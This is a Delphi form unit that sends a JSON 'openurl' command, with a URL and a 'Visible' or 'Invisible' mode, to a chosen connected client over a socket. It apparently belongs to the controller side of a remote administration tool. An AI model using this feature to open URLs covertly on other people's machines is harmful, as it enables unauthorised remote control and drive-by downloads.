unit UnitOpenURL;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls,
  System.JSON, ncLines;

type
  TOnSendJSON = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TOnUnregister = procedure(aLine: TncLine) of object;

  TForm8 = class(TForm)
    Edit1: TEdit;
    Button1: TButton;
    ComboBox1: TComboBox;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FLine: TncLine;
    FClientID: string;
    FOnSendJSON: TOnSendJSON;
    FOnUnregister: TOnUnregister;
  public
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TOnSendJSON; AUnregister: TOnUnregister);
    procedure DetachCallbacks;
  end;

var
  Form8: TForm8;

implementation

{$R *.dfm}

procedure TForm8.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TOnSendJSON; AUnregister: TOnUnregister);
begin
  FLine := aLine;
  FClientID := ClientID;
  FOnSendJSON := ASendJSON;
  FOnUnregister := AUnregister;
  Caption := 'Open URL - ' + FClientID;

  Button1.OnClick := Button1Click;
  OnClose := FormClose;
end;

procedure TForm8.DetachCallbacks;
begin
  FOnSendJSON := nil;
  FOnUnregister := nil;
  FLine := nil;
end;

procedure TForm8.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or (FLine = nil) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'openurl');
    JSONObj.AddPair('url', Edit1.Text);
    JSONObj.AddPair('mode', ComboBox1.Text); // 'Visible' or 'Invisible'
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm8.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) and (FLine <> nil) then
    FOnUnregister(FLine);
  Action := caFree;
end;

end.

